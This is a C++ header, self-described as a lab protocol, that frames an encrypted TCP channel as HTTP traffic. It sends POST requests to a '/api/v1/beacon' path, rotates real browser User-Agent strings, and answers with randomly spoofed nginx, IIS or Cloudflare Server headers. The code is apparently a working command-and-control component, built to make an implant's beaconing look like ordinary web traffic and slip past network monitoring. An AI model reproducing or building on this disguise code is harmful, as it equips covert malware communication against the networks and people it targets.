// HTTP-like framing over an encrypted TCP channel (header-only). This is a
// lab protocol, not an HTTP/TLS implementation.
#pragma once
#include "kx.h"
#include <string>
#include <cstdlib>

static bool http_send_all(SecureChannel& t, const std::string& data) {
    return t.send_all(data.data(), data.size());
}

static const char* http_pick_ua() {
    static const char* uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    };
    return uas[rand() % 3];
}

static bool http_read_body(SecureChannel& t, std::string& body) {
    std::string hdr;
    size_t header_end = std::string::npos;
    while ((header_end = hdr.find("\r\n\r\n")) == std::string::npos) {
        char tmp[1024];
        int n = t.recv(tmp, sizeof(tmp));
        if (n <= 0) return false;
        hdr.append(tmp, n);
        if (hdr.size() > (1 << 16)) return false;
    }

    size_t pos = hdr.find("Content-Length:");
    if (pos == std::string::npos) return false;
    pos += 15;
    while (pos < header_end && hdr[pos] == ' ') pos++;
    size_t end = hdr.find("\r\n", pos);
    if (end == std::string::npos || end > header_end || pos == end) return false;
    char* parsed_end = nullptr;
    unsigned long parsed = strtoul(hdr.c_str() + pos, &parsed_end, 10);
    if (parsed_end != hdr.c_str() + end || parsed > (1UL << 22)) return false;
    size_t len = (size_t)parsed;

    size_t body_start = header_end + 4;
    body = hdr.substr(body_start);
    while (body.size() < len) {
        char tmp[2048];
        int n = t.recv(tmp, sizeof(tmp));
        if (n <= 0) return false;
        body.append(tmp, n);
    }
    body.resize(len);
    return true;
}

static bool http_send_request(SecureChannel& t, const std::string& body, const std::string& host) {
    std::string req = "POST /api/v1/beacon HTTP/1.1\r\n";
    req += "Host: " + host + "\r\n";
    req += "User-Agent: ";
    req += http_pick_ua();
    req += "\r\n";
    req += "Content-Type: application/octet-stream\r\n";
    req += "Accept: */*\r\n";
    req += "Accept-Language: en-US,en;q=0.9\r\n";
    req += "Cache-Control: no-cache\r\n";
    req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    req += "Connection: keep-alive\r\n\r\n";
    req += body;
    return http_send_all(t, req);
}

static bool http_send_response(SecureChannel& t, const std::string& body) {
    static const char* servers[] = { "nginx/1.24.0", "Microsoft-IIS/10.0", "cloudflare" };
    std::string resp = "HTTP/1.1 200 OK\r\n";
    resp += "Server: ";
    resp += servers[rand() % 3];
    resp += "\r\n";
    resp += "Content-Type: application/octet-stream\r\n";
    resp += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    resp += "Connection: keep-alive\r\n\r\n";
    resp += body;
    return http_send_all(t, resp);
}
